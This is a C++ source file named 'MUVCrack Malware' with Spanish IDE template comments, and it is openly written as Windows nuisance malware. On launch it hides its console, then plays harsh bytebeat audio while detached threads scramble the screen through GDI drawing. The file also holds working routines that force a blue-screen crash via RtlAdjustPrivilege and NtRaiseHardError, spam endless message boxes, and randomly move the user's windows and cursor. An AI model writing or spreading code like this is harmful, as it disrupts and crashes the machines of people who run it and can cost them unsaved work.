// MUVCrack Malware.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//
#include <Windows.h>
#include <cmath>
#include <thread>
#include <winternl.h>
#include <mmsystem.h>

#pragma comment(lib, "winmm.lib")

#define SHUTDOWN_PRIVILEGE 19
#define OPTION_SHUTDOWN 6

typedef NTSTATUS //Return type
(NTAPI* pdef_RtlAdjustPrivilege) //Name
(ULONG Privilege, //Arugments below
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled);

typedef NTSTATUS //Return type
(NTAPI* pdef_NtRaiseHardError) //Name
(NTSTATUS ErrorStatus, //Arugments below
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask OPTIONAL,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response);


bool stopGDI1 = false, stopGDI2 = false, stopGDI3 = false, stopGDI4 = false;

void Bytebeat1() {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 24000;
    wfx.nAvgBytesPerSec = 24000;
    wfx.nBlockAlign = 1;
    wfx.wBitsPerSample = 8;
    wfx.cbSize = 0;

    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = (t | t >> 6) * 10 + (t / 128);
    }

    WAVEHDR wHeader;
    wHeader.lpData = buffer;
    wHeader.dwBufferLength = sizeof(buffer);
    wHeader.dwBytesRecorded = 0;
    wHeader.dwUser = 0;
    wHeader.dwFlags = 0;
    wHeader.dwLoops = 0;
    wHeader.lpNext = 0;
    wHeader.reserved = 0;

    waveOutPrepareHeader(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

void GDI1() {
    HDC hdc;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x;
    float i = 0;
    int i2 = 0;
    int timer = 0;
    while (!stopGDI1) {
        hdc = GetDC(0);
        BitBlt(hdc, rand() % w, 0, 100, h, hdc, rand() % w, 0, SRCCOPY);
        Sleep(1);
        timer++;
        i++;
        i2++;
        ReleaseDC(0, hdc);
    }
}

void Bytebeat2() {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.nAvgBytesPerSec = 8000;
    wfx.nBlockAlign = 1;
    wfx.wBitsPerSample = 8;
    wfx.cbSize = 0;

    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = ((t * (t * t & t * 9 % 257 - (t ^ t * 2) | t >> 8) & ~t >> 4) * (t >> 12 & 1) & 255) / 2 + (t * ((t >> 14 & 3) + 1) * ((~t >> 9 & 3) + 1) & 127);
    }

    WAVEHDR wHeader;
    wHeader.lpData = buffer;
    wHeader.dwBufferLength = sizeof(buffer);
    wHeader.dwBytesRecorded = 0;
    wHeader.dwUser = 0;
    wHeader.dwFlags = 0;
    wHeader.dwLoops = 0;
    wHeader.lpNext = 0;
    wHeader.reserved = 0;

    waveOutPrepareHeader(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void GDI2() {
    HDC hdc;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x, y;
    float i = 0;
    int i2 = 0;
    while (!stopGDI2) {
        hdc = GetDC(0);
        BitBlt(hdc, cos(i / 4) * 20, i2 * 10 % h, w, 10, hdc, 0, i2 * 10 % h, SRCCOPY);
        BitBlt(hdc, i2 * 10 % w, cos(i / 4) * 20, 10, h, hdc, i2 * 10 % w, 0, SRCCOPY);
        Sleep(1);

        i++;
        i2++;
        ReleaseDC(0, hdc);
    }
}
void Bytebeat3() {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.nAvgBytesPerSec = 8000;
    wfx.nBlockAlign = 1;
    wfx.wBitsPerSample = 8;
    wfx.cbSize = 0;

    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = t * 90 / (int(t * t / 800 & 4095) + 1);
    }

    WAVEHDR wHeader;
    wHeader.lpData = buffer;
    wHeader.dwBufferLength = sizeof(buffer);
    wHeader.dwBytesRecorded = 0;
    wHeader.dwUser = 0;
    wHeader.dwFlags = 0;
    wHeader.dwLoops = 0;
    wHeader.lpNext = 0;
    wHeader.reserved = 0;

    waveOutPrepareHeader(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

void GDI3() {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x, y;
    float i = 0;
    int i2 = 0;
    while (!stopGDI3) {
        HDC hdc = GetDC(NULL);
        POINT cursor;
        GetCursorPos(&cursor);
        DrawIcon(hdc, sin(i / 63) * (w / 2) + (w / 2), cos(i / 64) * (h / 2) + (h / 2), LoadIcon(NULL, IDI_APPLICATION));
        DrawIcon(hdc, cos(i / 63) * (w / 2) + (w / 2), sin(i / 64) * (h / 2) + (h / 2), LoadIcon(NULL, IDI_WARNING));
        DrawIcon(hdc, tan(i / 0.99) * (w / 2) + (w / 2), sin(i / 1.01) * (h / 2) + (h / 2), LoadIcon(NULL, IDI_QUESTION));
        PatBlt(hdc, rand() % w, rand() % h, 100, 100, PATCOPY);
        DrawIcon(hdc, sin(i) * (w / 1.5) + (w / 2), tan(-i) * (h / 2) + (h / 2), LoadIcon(NULL, IDI_ERROR));
        i++;
        i2++;
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
    }
}
void Bytebeat4() {
    HWAVEOUT hWaveOut;
    WAVEFORMATEX wfx;
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = 1;
    wfx.nSamplesPerSec = 8000;
    wfx.nAvgBytesPerSec = 8000;
    wfx.nBlockAlign = 1;
    wfx.wBitsPerSample = 8;
    wfx.cbSize = 0;

    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 20];

    for (DWORD t = 0; t < sizeof(buffer); t++)
    {
        buffer[t] = (t * t / 512 | t >> 4 | t >> 5);
    }

    WAVEHDR wHeader;
    wHeader.lpData = buffer;
    wHeader.dwBufferLength = sizeof(buffer);
    wHeader.dwBytesRecorded = 0;
    wHeader.dwUser = 0;
    wHeader.dwFlags = 0;
    wHeader.dwLoops = 0;
    wHeader.lpNext = 0;
    wHeader.reserved = 0;

    waveOutPrepareHeader(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &wHeader, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

void GDI4() {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x = 0, y = 0;
    float i = 0;
    int i2 = 0;
    float i3 = 0;
    while (!stopGDI4) {
        int fishy = rand() % 4;
        HDC hdc = GetDC(NULL);
        x++;
        if (x > w) {
            x = 0;
            y += 5;
        }
        if (y > h) {
            y = 0;
            x = 0;
        }
        SetPixel(hdc, x, y, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
        SetPixel(hdc, x, y + 1, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
        SetPixel(hdc, x, y + 2, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
        SetPixel(hdc, x, y + 3, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
        SetPixel(hdc, x, y + 4, RGB((rand() % 2) * 255, (rand() % 2) * 255, (rand() % 2) * 255));
        i += 1;
        i2++;
        i3++;
        ReleaseDC(0, hdc);
        DeleteDC(hdc);
    }
}


void FishyMessage() {

    while (1) {
        MessageBoxW(NULL, L"fish", L"fish", MB_OK);
        MessageBoxW(NULL, L"puarco", L"puarco", MB_OK);
    }
}

void WindowMove() {

    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        HWND Foreground = GetForegroundWindow();
        MoveWindow(Foreground, rand() % w, rand() % h, rand() % w, rand() % h, true);
        Sleep(rand() % 100);
    }
}


void CursorMove() {
    while (1) {
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
        SetCursorPos(rand() % w, rand() % h);
        Sleep(rand() % 1000);
    }
}

void BSOD() {
    //Stores return values of our nt calls
    BOOLEAN bEnabled;
    ULONG uResp;

    //Get raw function pointers from ntdll
    LPVOID lpFuncAddress1 = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

    //Create functions using above grabbed function pointers
    pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)lpFuncAddress1;
    pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)lpFuncAddress2;

    //Elevate the current process privledge to that required for system shutdown
    RtlAdjustPrivilege(SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bEnabled);

    //Call NtRaiseHardError with a floating point exception, causes BSOD
    NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, OPTION_SHUTDOWN, &uResp);
}
void sequence()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    Sleep(1000);
    Bytebeat1();
    std::thread t1(GDI1);
    t1.detach();
    Sleep(20000);
    stopGDI1 = true;
    Sleep(1000);
    Bytebeat2();
    std::thread t2(GDI2);
    t2.detach();
    Sleep(20000);
    stopGDI2 = true;
    Sleep(1000);
    Bytebeat3();
    std::thread t3(GDI3);
    t3.detach();
    Sleep(20000);
    stopGDI3 = true;
    Sleep(1000);
    Bytebeat4();
    std::thread t4(GDI4);
    t4.detach();
    Sleep(20000);
    stopGDI4 = true;
}


int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    sequence();
}


// Ejecutar programa: Ctrl + F5 o menú Depurar > Iniciar sin depurar
// Depurar programa: F5 o menú Depurar > Iniciar depuración

// Sugerencias para primeros pasos: 1. Use la ventana del Explorador de soluciones para agregar y administrar archivos
//   2. Use la ventana de Team Explorer para conectar con el control de código fuente
//   3. Use la ventana de salida para ver la salida de compilación y otros mensajes
//   4. Use la ventana Lista de errores para ver los errores
//   5. Vaya a Proyecto > Agregar nuevo elemento para crear nuevos archivos de código, o a Proyecto > Agregar elemento existente para agregar archivos de código existentes al proyecto
//   6. En el futuro, para volver a abrir este proyecto, vaya a Archivo > Abrir > Proyecto y seleccione el archivo .sln
